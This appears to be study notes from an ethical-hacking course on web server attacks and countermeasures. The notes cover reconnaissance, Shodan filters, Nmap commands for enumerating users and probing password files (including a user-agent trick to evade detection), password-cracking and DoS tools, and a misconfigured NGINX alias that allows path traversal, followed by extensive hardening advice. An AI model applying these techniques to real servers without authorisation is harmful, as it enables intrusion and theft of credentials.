			- Common Web Application Attacks:
				- Server-Side Request Forgery (SSRF) Attack: Attackers exploit SSRF vulnerabilities in public-facing web applications by sending maliciously crafted requests to internal or backend servers. Since these requests originate from the web server, the backend system trusts them, potentially exposing sensitive data.
				- Parameter/Form Tampering: Attackers manipulate parameters exchanged between the client and server to alter user credentials, permissions, and pricing information in applications. This can lead to unauthorized access or financial exploitation.
				- Cookie Tampering: By modifying persistent and non-persistent cookies, attackers can manipulate session data and bypass authentication mechanisms. Various tools are available to assist in modifying cookies for exploitation.
				- Unvalidated Input and File Injection Attacks: Attackers submit malicious input or inject files into a web application to exploit security gaps, potentially leading to code execution or data breaches.
				- Session Hijacking: Attackers steal, predict, or manipulate session tokens to gain unauthorized access to an authenticated user's session. This allows them to impersonate users and perform malicious actions.
				- SQL Injection (SQLi) Attacks: SQL injection exploits database vulnerabilities by injecting malicious SQL code into input fields. When executed, this code can manipulate or extract sensitive data from the database.
				- Directory Traversal: Attackers manipulate URLs to access restricted directories and execute unauthorized commands outside the web server’s root directory, potentially exposing confidential files.
				- Denial-of-Service (DoS) Attack: A DoS attack overloads the server with excessive requests, causing service disruptions and making the website unavailable to legitimate users.
				- Cross-Site Scripting (XSS) Attacks: Attackers inject malicious scripts (JavaScript, HTML, etc.) into web pages viewed by other users, enabling them to steal credentials, hijack sessions, or redirect victims to malicious websites.
				- Buffer Overflow Attacks: When a web application fails to properly manage data input, attackers can flood it with excessive data, causing crashes or unpredictable behavior that may expose vulnerabilities.
				- Cross-Site Request Forgery (CSRF) Attack: Attackers exploit the trust of authenticated users by tricking them into executing unauthorized commands on a web server, often without their knowledge.
				- Command Injection Attacks: By injecting malicious commands into form fields or insecure inputs, attackers can alter web content or execute unauthorized system commands.
				- Source Code Disclosure: Due to script misconfigurations or typographical errors, attackers may gain access to source code containing database credentials, secret keys, or other sensitive information, compromising the web server.
- Web Server Attack Methodology:
	- Information Gathering:
		- Information gathering is the first and one of the most crucial steps in hacking a target web server. During this phase, an attacker collects as much information as possible about the target server using various tools and techniques. The information gathered during this step helps the attacker assess the security posture of the web server.
		- Attackers may search the internet, newsgroups, bulletin boards, and other sources to gather information about the target organization. Tools such as Whois and Whois Lookup can be used to extract details such as the target's domain name, IP address, and autonomous system number.
		- Information Gathering Tools:
			- who.is (who.is): who.is is a platform designed to perform a variety of Whois lookup functions. It allows users to perform domain Whois searches, Whois IP lookups, and Whois database searches to obtain relevant information about domain registration and availability.
			- Whois Lookup (whois.domaintools.com)
			- Whois (www.whois.com)
			- Domain Dossier (centralops.net)
			- Subdomain Finder (pentest-tools.com)
		- Information Gathering from the Robots.txt File:
			- The robots.txt file contains a list of web server directories and files that the website owner wants to hide from web crawlers. It is primarily used to guide search engine bots on which pages should or should not be indexed. However, a poorly configured robots.txt file can unintentionally expose sensitive directories and files to attackers.
			- If confidential files and directories are indexed, an attacker may easily obtain sensitive information such as passwords, email addresses, hidden links, and membership areas. Even if a website owner attempts to restrict certain pages from being indexed, an attacker can still access the robots.txt file and identify restricted files or directories. This can provide valuable insights into the website’s structure and security vulnerabilities.
			- An attacker can simply request the robots.txt file by entering URL/robots.txt in a browser’s address bar to view its contents. Additionally, they can use tools such as Wget to download the robots.txt file and analyze it for sensitive information, including the root directory structure and content management system (CMS) details of the target website.
	- Web Server Footprinting/Banner Grabbing:
		- Web server footprinting allows an attacker to gather valuable system-level data such as account details, operating systems (OSs), software versions, server names, and database schema details. By analyzing the collected data, attackers can assess the security posture of a web server and identify potential entry points for further exploitation.
		- The Telnet utility can be used to footprint a web server and obtain information such as the server name, server type, OS, and running applications. Additionally, footprinting tools such as httprecon, Uniscan, and Netcraft can be used to extract information from a target server.
		- These tools help attackers determine critical details, including remote access capabilities, open ports, available services, and potential security vulnerabilities.
		- Web Server Footprinting Tools:
			- Netcat (netcat.sourceforge.net):
				- Netcat is a networking utility that reads and writes data across network connections using the TCP/IP protocol. It is a reliable back-end tool that can be used directly or integrated into scripts and other programs. Additionally, Netcat serves as a network debugging and exploration tool.
			- Telnet (learn.microsoft.com):
				- Telnet is a client-server network protocol commonly used on the Internet and local area networks (LANs) to establish remote login sessions. It allows a terminal on one computer to connect to another system, emulating a direct session.
				- However, Telnet has significant security vulnerabilities: It does not encrypt data sent through the connection and It lacks a robust authentication mechanism.
				- Due to these weaknesses, attackers can exploit Telnet to perform banner-grabbing attacks, probing HTTP servers to retrieve server details from HTTP response headers.
			- httprecon (www.computec.ch):
				- httprecon is an advanced web server fingerprinting tool. It performs banner grabbing, status code enumeration, and header ordering analysis on the target web server, providing accurate fingerprinting information.
				- httprecon executes various header analysis test cases on the target web server, including:
					- A legitimate GET request for an existing resource
					- An excessively long GET request (a Uniform Resource Identifier (URI) >1024 bytes)
					- A standard GET request for a non-existing resource
					- A standard HEAD request for an existing resource
					- Enumeration with OPTIONS, if allowed
					- The DELETE HTTP method, which is usually not permitted
					- The TEST HTTP method, which is undefined
					- The protocol version HTTP/9.8, which does not exist
					- A GET request containing attack patterns (e.g., ../ and %%)
			- Uniscan (sourceforge.net):
				- Uniscan is a versatile web server fingerprinting tool that goes beyond basic commands such as ping, traceroute, and nslookup. It conducts static, dynamic, and stress tests on web servers.
				- In addition to scanning websites, Uniscan performs automated Bing and Google searches for specific IP addresses and compiles all the collected data into a comprehensive report file for further analysis.
			- Netcraft (www.netcraft.com)
			- ID Serve (www.grc.com)
			- Nmap (nmap.org)
			- Ghost Eye (github.com)
			- Skipfish (code.google.com)
		- IIS Information Gathering Using Shodan:
			- Gathering information on IIS (Internet Information Services) servers can provide attackers with crucial details that aid in planning and executing further attacks. By identifying the IIS version in use, attackers can match known vulnerabilities to specific versions, making exploitation easier. Additionally, information such as open ports, running services, and server configurations can expose security weaknesses.
			- A detailed understanding of the IIS server environment allows attackers to craft targeted attacks. For example, if the gathered data indicates that a particular server runs an outdated IIS version, attackers may deploy exploits targeting known vulnerabilities associated with that version.
			- To gather such information, attackers use tools like Shodan, a powerful search engine designed to scan and index internet-connected devices, including IIS servers. Shodan enables attackers to efficiently collect data that enhances their ability to perform targeted attacks.
			- Shodan Search Filters for Information Gathering:
				- Identify IIS servers with SSL certificates issued to "Company Inc.": ssl:"Company Inc." http.title:"IIS"
				- Locate IIS servers with SSL certificates where the common name (CN) is "company.in": ssl.cert.subject.CN:"company.in" http.title:"IIS"
				- Find IIS servers located in the United States: http.title:"IIS Windows Server" country:"US"
				- Locate IIS7 servers running on port 80: http.title:"IIS7" port:80
			- Attackers can analyze Shodan search results to extract information such as IP addresses, open ports, running services, and IIS version details. By clicking on individual results, they can obtain more in-depth data, including HTTP headers, SSL certificate details, and additional metadata. Furthermore, Shodan's export feature allows attackers to save collected data in formats like CSV or JSON for further analysis.
		- Abusing Apache mod_userdir to Enumerate User Accounts:
			- Attackers can exploit Apache’s mod_userdir module to enumerate user accounts on a web server. This module allows access to user directories using URIs formatted as /~username/. Using the Nmap tool, attackers can identify valid usernames and obtain valuable information, which can then be leveraged for further attacks, such as brute-forcing or targeted phishing.
			- Enumerating User Accounts from an Apache Server:
				- Perform an Initial Scan to Enumerate Valid Users:
					- Run the following command to enumerate valid users from a target web server with mod_userdir enabled: nmap -p80 --script http-userdir-enum <target>
					- This command scans the target on port 80 using the http-userdir-enum script. If mod_userdir is enabled, the script uses the default word list usernames.lst located at /nselib/data/ and displays any discovered usernames.
				- Perform a Customized Scan:
					- A custom list of potential usernames can improve accuracy and effectiveness. Use the following command with a custom word list <Wordlist>.txt: nmap -p80 --script http-userdir-enum --script-args userdir.users=<Wordlist>.txt <target>
					- This command utilizes the specified .txt file as a source of usernames and tests them against the target server.
				- Bypass Detection with a Custom User-Agent:
					- Some security systems detect and block Nmap requests due to its default user-agent string. To bypass such detection, specify a custom user-agent: nmap -p80 --script http-brute --script-args http.useragent="<User_Agent>" <target>
					- This command modifies the HTTP user-agent string used by Nmap, making the traffic appear to originate from a standard web browser rather than a scanning tool.
		- Enumerating Web Server Information Using Nmap:
			- Nmap, along with the Nmap Scripting Engine (NSE), can extract valuable information from a target web server. NSE provides scripts that help attackers gather various types of useful data about the target system. The Nmap commands and NSE scripts can be used for reconnaissance.
			- Nmap Commands for Extracting Web Server Information:
				- Discover virtual domains with hostmap: nmap --script hostmap-bfk <host>
				- Detect a vulnerable server using the TRACE method: nmap --script http-trace -p80 localhost
				- Harvest email accounts using http-google-email: nmap --script http-google-email <host>
				- Enumerate users using http-userdir-enum: nmap -p80 --script http-userdir-enum localhost
				- Detect HTTP TRACE: nmap -p80 --script http-trace <host>
				- Check if the web server is protected by a WAF or IPS: nmap -p80 --script http-waf-detect --script-args="http-waf-detect.uri=/testphp.vulnweb.com/artists.php,http-waf-detect.detectBodyChanges" www.modsecurity.org
				- Fingerprint a Web Application Firewall (WAF): nmap --script=http-waf-fingerprint -p80,443 <host>
				- Enumerate common web applications: nmap --script http-enum -p80 <host>
				- Obtain robots.txt file: nmap -p80 --script http-robots.txt <host>
				- Service and OS detection on a target: nmap -sV -O -p <target IP address>
				- Enumerate web applications: nmap -sV --script http-enum <target IP address>
				- Check for FrontPage login: nmap <target IP address> -p 80 --script=http-frontpage-login
				- Check for password file exposure: nmap --script http-passwd --script-args http-passwd.root=/ <target IP address>
		- Finding Default Credentials of Web Server:
			- Administrators and security personnel use administrative interfaces to securely configure, manage, and monitor web application servers. Many web server administrative interfaces are publicly accessible and located in the root directory. However, these credentials are often not properly configured and remain set to default.
			- Attackers attempt to identify the running administrative interface of a target web server by performing port scanning. If an attacker successfully exploits default credentials, they can gain access to the administrative interface, compromise the web server, and exploit the main web application.
			- Once they identify the interface, they use the following techniques to find default login credentials:
				- Consult administrative interface documentation to identify default passwords.
				- Use Metasploit’s built-in database to scan the server for known credentials.
				- Attempt password-guessing and brute-force attacks to gain unauthorized access.
				- Leverage online resources such as:
					- CIRT.net: A database of default passwords, credentials, and ports
					- FortyPoundHead.com: A resource for identifying default passwords
					- www.fortypoundhead.com
					- www.defaultpassword.com
					- default-password.info
					- www.routerpasswords.com
		- Finding Default Content on Web Server:
			- Many web application servers contain default content and functionalities that attackers can exploit.
			- Common default elements that attackers seek to identify in web servers:
				- Administrative Debugging and Testing Functionalities: Web servers often include debugging, diagnostic, and testing features for administrators. These features provide valuable configuration details and runtime state information about the server and its applications, making them prime targets for attackers.
				- Sample Scripts and Demonstration Functionalities: Many web servers contain sample scripts and pages designed to demonstrate application server features and APIs. Often, these scripts are not properly secured and may contain vulnerabilities that attackers can exploit. Additionally, some demonstration functionalities may include exploitable features that attackers can leverage.
				- Publicly Accessible Powerful Functions: Some web servers include powerful administrative functionalities that should be restricted from public access. However, attackers often attempt to exploit these functions to compromise the server. For example, certain application servers allow web archives to be deployed over the same HTTP port used by the application. Attackers may use tools like Metasploit to scan for default passwords, upload backdoors, and gain command-shell access to the target server.
				- Server Installation Manuals: Attackers seek out publicly accessible server installation manuals, as they may contain crucial details about server configurations and setup processes. Access to this information helps attackers prepare targeted exploitation strategies against the installed web server.
			- Tools for Identifying Default Content - Nikto2 (cirt.net): Nikto is a widely used vulnerability scanner that helps identify security weaknesses in web applications and web servers, including default content that could be exploited by attackers.
		- Directory Brute Forcing:
			- When a web server receives a request for a directory rather than a specific file, it may respond in one of the following ways:
				- Return a Default Resource: The server may return a default resource within the directory, such as index.html.
				- Return an Error: The server may return an error, such as an HTTP status code 403, indicating that access is not permitted.
				- Return a Directory Listing: The server may return a directory listing showing the contents of the requested directory. A sample directory listing is shown in the screenshot.
			- Security Risks of Directory Listings:
				- While directory listings are not inherently a major security risk, they can sometimes expose vulnerabilities that attackers can exploit, including:
				- Improper Access Controls – Misconfigured permissions may allow unauthorized access to sensitive files.
				- Unintentional Access to the Web Root – Attackers may gain access to critical files and directories that should remain hidden.
			- Attack Techniques:
				- After discovering a directory on a web server, an attacker will attempt to access its listing by sending a request to that directory. Attackers also target vulnerable web server software that improperly grants access to directory listings. To automate these attacks, they use tools like Dirhunt and Sitechecker Website Directory Scanner to scan for exposed directories on a target web server.
			- Tools for Directory Brute Forcing - Dirhunt (github.com):
				- Dirhunt is a web crawler optimized for searching and analyzing directories. It is particularly useful when a server has the "index of" mode enabled. Additionally, Dirhunt can detect directories even when directory listing is disabled, by identifying:
					- False 404 errors
					- Directories with empty index files used to hide content
					- Other misconfigurations that reveal hidden resources
	- Website Mirroring:
		- Website mirroring is a technique used to copy an entire website and its content onto another server for offline browsing. By creating a mirrored version of a website, an attacker can analyze its structure in detail, potentially identifying vulnerabilities and sensitive information.
	- Vulnerability Scanning:
		- Vulnerability scanning is the process of identifying security weaknesses and misconfigurations in a target web server or network. It helps uncover potential vulnerabilities that attackers can exploit in a web server attack.
		- During the vulnerability scanning phase, attackers use sniffing techniques to monitor network traffic, allowing them to identify active systems, network services, and running applications. Automated tools, such as Acunetix Web Vulnerability Scanner, are commonly used to scan target servers for vulnerabilities, detect active hosts and services, and identify security flaws.
		- Vulnerability Scanning Tools:
			- Acunetix Web Vulnerability Scanner:
				- Acunetix Web Vulnerability Scanner (WVS) is a powerful tool for detecting vulnerabilities in web applications. It checks for security issues such as SQL injection, Cross-Site Scripting (XSS), and other web-based attacks.
				- Acunetix Web Vulnerability Scanner includes advanced penetration testing tools to assist in manual security audits and generates detailed security reports using AcuSensor Technology. It supports testing of web forms, password-protected areas, CAPTCHA-protected pages, single sign-on (SSO), and two-factor authentication (2FA) mechanisms. Additionally, it identifies programming languages, web server types, and mobile-optimized sites. The scanner can analyze websites built with HTML5, SOAP, and AJAX while also performing network service and port scanning on the target web server.
			- OpenText Fortify WebInspect (www.opentext.com)
			- Tenable.io (www.tenable.com)
			- ImmuniWeb (www.immuniweb.com)
			- Invicti (www.invicti.com)
		- Nginx Vulnerability Scanning Using NginxPwner:
			- NginxPwner is a Python-based tool designed to identify common misconfigurations and vulnerabilities in Nginx web servers. It automates the process of detecting security issues, such as misconfigured HTTP methods, improper file permissions, outdated software versions, and insecure default settings. By using this tool, security professionals can quickly gather detailed information on potential entry points and weaknesses in an Nginx setup, helping to improve security defenses.
			- Steps to Scan an Nginx Web Server for Vulnerabilities:
				- Create a temporary file to store a list of potential URL paths acquired via crawling or other methods: nano /tmp/pathlist
				- Insert the paths into this file, then save and exit using CTRL+X.
				- Execute the NginxPwner script, specifying the target URL and the path file: python3 nginxpwner.py <target_URL> /tmp/pathlist
				- Replace <target_URL> with the actual target URL and /tmp/pathlist with the path to your list file.
				- Analyze the output provided by NginxPwner to identify potential vulnerabilities and misconfigurations in the target Nginx server.
		- Finding Exploitable Vulnerabilities:
			- Flaws and programming errors in software design lead to security vulnerabilities. Many public vulnerability repositories available online provide access to information about various software vulnerabilities. Attackers often search exploit sites such as Packet Storm (packetstormsecurity.com) and the Exploit Database (www.exploit-db.com) for vulnerabilities affecting a web server based on its OS and software applications.
			- Using the information gathered in previous stages, attackers identify relevant vulnerabilities through the Exploit Database. Exploiting these vulnerabilities allows them to execute commands or binaries on a target machine, escalate privileges, or bypass security mechanisms. In some cases, attackers can even gain access to privileged user accounts and credentials.
			- Finding Exploitable Web Server Vulnerabilities Using Exploit Database (www.exploit-db.com):
				- Visit the Exploit Database Website and Navigate to the Exploit Database website.
				- Use the Search Functionality - Enter keywords related to the target web server in the search bar (e.g., "Apache," "IIS," "nginx").
				- Filter Search Results - Apply filters to refine search results:
					- Type: Select "Webapps" for web server-related exploits.
					- Platform: Choose the appropriate OS (e.g., Windows, Linux).
					- Date: Specify a date range to find recent vulnerabilities.
					- Analyze the Results
				- Review the search results to identify relevant vulnerabilities. Each entry includes details such as the vulnerability description, affected software version, and exploit type.
				- Review Exploit Details - Click on an exploit to access detailed information, including:
					- Exploit Code: The actual script or code used to exploit the vulnerability.
					- Description: A detailed explanation of the vulnerability and how it can be exploited.
					- References: Links to additional resources or advisories.
				- Verify the Vulnerability - Cross-check the identified vulnerabilities with the versions and configurations of the target web server to ensure applicability.
				- Download and Test Exploits - If relevant, download the exploit code and test it in a controlled environment to verify its effectiveness.
	- Session Hijacking:
		- Attackers can perform session hijacking by identifying an active client session and taking complete control of it. Through session hijacking, an attacker can gain unauthorized access to a web server and intercept sensitive data by exploiting valid session IDs.
		- Various techniques can be used to hijack or steal session data, including:
			- Session Token Prediction – Guessing or predicting session tokens based on weak randomness.
			- Session Replay – Reusing captured session tokens to gain access.
			- Session Fixation – Forcing a user to authenticate with a known session ID.
			- Sidejacking – Intercepting session cookies over insecure networks.
			- Cross-Site Scripting (XSS) – Injecting malicious scripts to steal session tokens.
		- Attackers use tools such as Burp Suite, JHijack, and Ettercap to automate session hijacking.
		- Session Hijacking Tools:
			- Burp Suite (portswigger.net): Burp Suite is a web security testing tool that can analyze and hijack session IDs in active sessions. The Sequencer tool in Burp Suite evaluates the randomness of session tokens. Attackers can use this tool to predict session tokens and take over valid sessions.
			- JHijack (sourceforge.net)
			- Ettercap (www.ettercap-project.org)
	- Web Server Password Hacking:
		- In this phase of web server hacking, an attacker attempts to crack web server passwords using various password-cracking techniques. These may include password guessing, dictionary attacks, brute-force attacks, hybrid attacks, precomputed hashes, rule-based attacks, distributed network attacks, and rainbow table attacks.
		- Since some of these methods are tedious and time-consuming, attackers often require patience. To expedite the process, attackers can use automated tools such as Hashcat, THC Hydra, and Ncrack to crack web passwords and hashes.
		- Hashcat (hashcat.net):
			- Hashcat is a password-cracking tool compatible with multiple operating systems and platforms. It supports multi-hash cracking (MD4, MD5, SHA-224, SHA-256, SHA-384, SHA-512, RIPEMD-160, etc.) and multi-device processing.
			- The tool offers several attack modes, including: Straight attack, Combination attack, Brute-force attack, Hybrid dictionary + mask attack, Hybrid mask + dictionary attack
		- THC Hydra (github.com):
			- THC Hydra is a parallelized login cracker capable of attacking numerous protocols. It is primarily used by security researchers and penetration testers to demonstrate how easily unauthorized access can be gained.
			- THC Hydra supports the following protocols:
				- Authentication & Access Control: Cisco AAA, Cisco auth, Cisco enable, LDAP, RDP, Rlogin, Rsh, SSH (v1 & v2), SSH key, Telnet, VMware-Auth
				- Web & Network Services: FTP, HTTP (GET, POST, HEAD, Proxy, Form-based), HTTPS (GET, POST, HEAD, Proxy, Form-based), SOCKS5, VNC
				- Databases: Firebird, Microsoft SQL Server, MongoDB, MySQL, Oracle (Listener, SID), Postgres
				- Email & Messaging: IMAP, ICQ, NNTP, POP3, SMTP, SMTP Enum, SNMP (v1, v2, v3), XMPP
				- Other Services: Asterisk, Apple Filing Protocol (AFP), Concurrent Versions System (CVS), Memcached, Network Control Protocol (NCP), PC-Anywhere, PC-NFS, Radmin, Real-Time Streaming Protocol (RTSP), SAP R/3, Session Initiation Protocol (SIP), Simple Network Management Protocol (SNMP), Subversion, TeamSpeak (TS2)
			- Ncrack (nmap.org)
			- Rainbow Crack (project-rainbowcrack.com)
			- Wfuzz (www.edge-security.com)
			- Wireshark (www.wireshark.org)
	- Using an Application Server as Proxy:
		- Web servers are sometimes configured to function as forwarding or reverse HTTP proxies. When these functionalities are enabled, attackers can exploit them to:
			- Attack third-party systems on the internet
			- Connect to arbitrary hosts within an organization’s internal network
			- Establish connections to other services running on the proxy host itself
		- To leverage vulnerable web servers as proxies, attackers commonly use GET and CONNECT requests to connect to target systems and extract information through the compromised web servers.
	- Path Traversal via Misconfigured NGINX Alias:
		- An attacker can exploit a misconfiguration in the nginx.conf file of a targeted Nginx web server, particularly due to the improper usage of the alias directive. This vulnerability arises when the alias directive is used without a trailing slash, as shown in the following misconfigured example:
			- Webroot Misconfiguration in nginx.conf:
				location /i {  
					alias /data/w3/images/;  
				}
			- In this scenario, the absence of a trailing slash (/) allows attackers to manipulate the URL to access directories and files outside the designated web root. By appending traversal sequences such as ../, attackers can navigate the file system to restricted locations, potentially exposing sensitive data or system files.
		- Exploiting This Vulnerability Using Kyubi (github.com):
			- Kyubi is a Python-based security tool designed to detect and exploit path traversal vulnerabilities in Nginx web servers caused by misconfigured alias directives. It automates the process of testing URL paths for potential traversal weaknesses.
			- Kyubi recursively brute-forces the URL path to identify and list files or directories that may be exposed due to misconfigurations.
		- Potential Impact of Exploiting This Misconfiguration:
			- If successfully exploited, this vulnerability can allow attackers to access sensitive files outside the web root, including configuration files and credentials. This can lead to severe consequences such as:
				- Data theft – Exposure of sensitive business or user information.
				- Website defacement – Unauthorized modification of website content.
				- Complete server compromise – Gaining access to critical system files and escalating privileges.
			- Proper configuration of the alias directive with a trailing slash (/) is essential to prevent path traversal attacks and secure Nginx web servers.
	- Web Server Attack Tools:
		- Immunity’s CANVAS (www.immunityinc.com): Immunity’s CANVAS provides penetration testers and security professionals with hundreds of exploits, an automated exploitation system, and a comprehensive, reliable exploit development framework. It provides features such as client-side exploitation, privilege escalation, HTTP tunneled privilege escalation, remote kernel exploitation, advanced backdoor technology, and advanced web attack technology.
		- OpenVAS (www.openvas.org)
		- THC Hydra (github.com)
		- HULK DoS (github.com)
		- MPack (sourceforge.net)
- Web Server Attack Countermeasures:
	- Patches and Updates:
		- Regularly scan for vulnerabilities and apply necessary patches and updates.
		- Review all relevant documentation before implementing any hotfix or security patch.
		- Test service packs and hotfixes in a non-production environment before deployment.
		- Maintain consistent security patch levels across all domain controllers (DCs).
		- Schedule server outages and ensure backup tapes and emergency repair disks are available.
		- Keep a rollback plan to restore systems to their original state in case of failure.
		- Disable unused script extension mappings and avoid default web server configurations.
		- Utilize virtual patches for enhanced identification and logging.
		- Establish a disaster recovery plan for patch management failures.
		- Conduct risk assessments to prioritize high-risk areas for patching.
		- Maintain an inventory of all endpoints, services, and dependencies.
		- Always test patches in a controlled environment before full deployment.
		- Implement an alerting system for patches.
		- Use automated patch management tools like SolarWinds Patch Manager.
		- Regularly monitor and report patch management effectiveness.
		- Limit the number of software versions to reduce third-party risks.
		- Validate and document all patch and update operations for analysis and compliance.
		- Integrate standardized patch management and security updates into the SDLC.
	- Protocols:
		- Block all unnecessary ports, ICMP traffic, and insecure protocols.
		- Harden the TCP/IP stack and apply the latest software patches.
		- Use secure communication protocols such as TLS/SSL and enforce HTTPS redirection.
		- Secure remote access with tunneling and encryption protocols.
		- If using insecure protocols (e.g., Telnet, SMTP, FTP), implement secure authentication and encryption (e.g., IPsec policies).
		- Require FTPS for all file transfers to ensure data encryption.
		- Ensure unidentified FTP servers operate in a separate directory from the web server.
		- Configure the HTTP service banner to hide sensitive host details (e.g., OS version, type).
		- Isolate supporting servers (e.g., LDAP) on a separate subnet and filter traffic through a firewall.
		- Use HTTP Strict Transport Security (HSTS) headers to enforce secure connections and prevent downgrade attacks.
		- Automate SSL/TLS certificate renewal to prevent expiration-related vulnerabilities.
		- Implement rate-limiting to mitigate DDoS attacks targeting the SSL/TLS handshake process.
	- Accounts:
		- Remove unused modules, application extensions, and default user accounts created during OS installation.
		- Grant the least possible NTFS permissions to anonymous IIS users when creating a new web root directory.
		- Follow the principle of least privilege for database applications, eliminating unnecessary database users and stored procedures.
		- Use secure permissions, including NTFS permissions, .NET Framework access control, and URL authorization.
		- Slow down brute-force and dictionary attacks with strong password policies, audits, and login failure alerts.
		- Run processes and services using least privileged accounts.
		- Limit administrator or root-level access to essential users only and maintain access records.
		- Maintain encrypted logs of all user activity on the web server or a separate intranet machine.
		- Disable noninteractive accounts that do not require interactive logins.
		- Use secure VPNs (e.g., OpenVPN) for multi-server access to minimize credential exposure.
		- Enforce password management best practices, including password expiration policies and the use of password managers (e.g., KeePass).
		- Enable Separation of Duties (SoD) in server configurations.
		- Implement account security features, including account lockout after failed login attempts and CAPTCHA challenges on login/registration pages.
		- Require two-factor or multi-factor authentication (2FA/MFA) for additional security.
		- Store passwords securely using strong, one-way hashing algorithms like bcrypt, scrypt, or Argon2.
		- Ensure secure account recovery processes that verify user identity without increasing takeover risks.
	- Files and Directories:
		- Remove unnecessary files, including non-web files (e.g., archives, backups, text files, header/include files) and unused .jar contents.
		- Avoid storing sensitive configuration information within byte code.
		- Disable directory listing and restrict access to configuration files (e.g., .htaccess, web.config).
		- Prevent unauthorized file access by disabling certain file types via resource mapping.
		- Store web applications, scripts, and website files separately from the OS, logs, and system files.
		- Run the web server within a sandbox directory to prevent access to system files.
		- Restrict non-web file types from being referenced in URLs.
		- Run web server processes with the least required privileges and grant access only to necessary directories.
		- Monitor and analyze logs from network services, website access, databases (e.g., SQL Server, MySQL, Oracle), and the OS.
		- Exclude meta characters while processing user inputs to ensure proper filtering.
		- Use file integrity checkers for intrusion detection and web content verification.
		- If allowing file uploads, scan uploaded files for malware and store them outside the web root.
		- Use a Web Application Firewall (WAF) to prevent unauthorized file access through web-based attacks (e.g., SQL injection).
		- Encrypt file transfers using SFTP instead of FTP.
		- Implement version control for web application files to track changes and enable rollbacks.
	- Detecting Web Server Hacking Attempts:
		- An attacker exploiting web server vulnerabilities may plant backdoors to maintain access, launch phishing attacks, or send spam. Victims often remain unaware until the server is blacklisted or visitors are redirected to malicious sites. Detecting such attacks is difficult until significant damage occurs, making early detection crucial for protection.
		- Website Change Detection System (WDS):
			- When an attacker installs a backdoor on a web server, the size of infected files increases.
			- A Website Change Detection System (WDS) is a script that runs on the server to monitor modifications to executable files or the addition of new files, including HTML, JavaScript (JS), PHP, Active Server Pages (ASP), Perl, and Python files.
			- WDS operates by periodically comparing the hash values of server files with their corresponding master hash values to detect unauthorized changes to the codebase. If any modifications are detected, the system alerts the user to take necessary action. Thus, WDS plays a critical role in identifying web server hacking attempts at an early stage.
			- For example, DirectoryMonitor is an automated tool that scans web directories, detects changes in the codebase, and notifies the user via email.
	- Defend Against Web Server Attacks:
		- Ports:
			- Regularly monitor all ports on the web server to prevent unnecessary traffic. Unmonitored traffic can leave the server vulnerable to malware attacks.
			- Public access to port 80 (HTTP) and port 443 (HTTPS) should be restricted. Traffic to these ports should be carefully controlled.
			- If port 80 remains open, the server is at risk of Denial-of-Service (DoS) attacks, which can overload and consume server resources.
			- Intranet traffic should be either encrypted or restricted to enhance security.
			- Attackers often attempt to spoof IP addresses to conceal their identity. To counter this:
				- Security logs should be analyzed to detect suspicious activity.
				- Firewall rules can be configured with a "deny this IP address" rule to block malicious sources.
				- A routed blackhole command can be used to drop malicious traffic and prevent it from reaching the target system.
		- Server Certificates:
			- Server certificates enhance security and are issued by a trusted authority. However, attackers may compromise certified servers by using forged certificates to intercept secure communications through Man-in-the-Middle (MITM) attacks. To mitigate such risks, the following techniques can be used:
			- Direct certificate validation to verify authenticity.
			- Alternative protocols that do not rely on third-party certificate validation.
			- Domain-based certificate verification, allowing domains to securely inspect their own certificates using pre-established user authentication credentials.
			- Strong cryptographic techniques that improve server identity validation and address the limitations of third-party solutions.
			- Ensuring certificate validity, including checking expiration dates and confirming that certificates are used for their intended purpose.
			- Verifying certificate revocation status, ensuring the certificate’s public key remains valid and is traceable to a trusted root authority.
		- Machine.config:
			- The machine.config file provides a mechanism for securing information by modifying machine-level settings. These settings impact all applications running on the system. The machine.config file includes configuration settings for the .NET Framework, which influence security.
			- The following security measures should be implemented using the machine.config file:
				- Map protected resources to HttpForbiddenHandler and remove any unused HttpModules.
				- Disable tracing (<trace enabled="false"/>) and ensure that debug compilation is turned off.
				- Prevent ASP.NET errors from being exposed to clients.
				- Verify session state settings to ensure proper security configurations.
		- Code Access Security:
			- Adopt secure coding practices to prevent source code disclosure and input validation attacks.
			- Restrict code access security policies to ensure that no permissions are granted for executing code downloaded from the Internet or intranet.
			- Configure IIS to:
				- Reject URLs containing "../" to prevent path traversal attacks.
				- Lock down system commands and utilities using restrictive access control lists (ACLs).
				- Regularly install security patches and updates.
			- Enforce code access security on web servers to prevent the execution of malicious code.
			- Failure to implement these measures can leave web servers vulnerable to attacks that exploit insecure code execution.
		- Restrict Access and Permissions:
			- Apply restricted ACLs and block remote registry administration.
			- Secure the SAM (for stand-alone servers).
			- Harden NTFS permissions for the metabase file, shared folders, and website directories.
			- Remove unnecessary file shares, including default admin shares, if not required.
			- Restrict directory listings and enforce proper file permissions.
			- Limit server functionality to only required web technologies.
		- Harden Web Server Configuration:
			- Remove unnecessary IIS script mappings and ISAPI filters.
			- Relocate websites and virtual directories to non-system partitions.
			- Do not install IIS on a domain controller.
			- Use a dedicated machine for the web server.
			- Turn off unused features, such as server-side scripting and directory browsing.
			- Configure separate anonymous user accounts for different applications.
		- Enhance Network Security:
			- Implement firewalls to control incoming and outgoing traffic.
			- Use network segmentation, VPNs, and secure protocols (e.g., HTTPS) to limit unauthorized access.
			- Screen and filter incoming traffic requests.
			- Deploy IDPS to monitor and detect malicious activity.
		- Secure Authentication and Sessions:
			- Use server-side session ID tracking and match connections with timestamps, IP addresses, etc.
			- Implement role-based access control (RBAC) and least privilege principles.
		- Protect Data and Logs:
			- Store website files and scripts on a separate partition or drive.
			- Enable minimum-level auditing and use NTFS permissions to protect log files.
			- Implement centralized log monitoring to track activities and analyze logs for suspicious behavior.
			- Set up alerts for security events and establish an incident response plan.
		- Physical and Environmental Security:
			- Physically secure the web server in a restricted machine room.
			- Prevent local logins except for administrators.
		- Security Tools and Automation:
			- Use security tools provided with web server software.
			- Deploy scanners that automate web server security checks.
			- Implement an anti-bot mitigation service (e.g., DataDome) to detect botnets in real time.
	- Defend Against HTTP Response Splitting and Web Cache Poisoning:
		- When setting cookies, remove carriage returns (CRs) and line feeds (LFs) before inserting data into an HTTP response header. The best practice is to use third-party security tools to test for vulnerabilities and defend against CRLF injection. Ensure that application engines are up to date.
		- The User Datagram Protocol (UDP) source port randomization technique helps protect servers from blind response forgery. Limit the number of simultaneous recursive queries and increase the time-to-live (TTL) values of legitimate records.
		- Methods to Defend Against HTTP Response Splitting and Web Cache Poisoning:
			- Server Administration:
				- Use the latest web server software.
				- Regularly update and patch the operating system (OS) and web server.
				- Run a web vulnerability scanner.
			- Application Development:
				- Restrict the web application’s access to unique IP addresses.
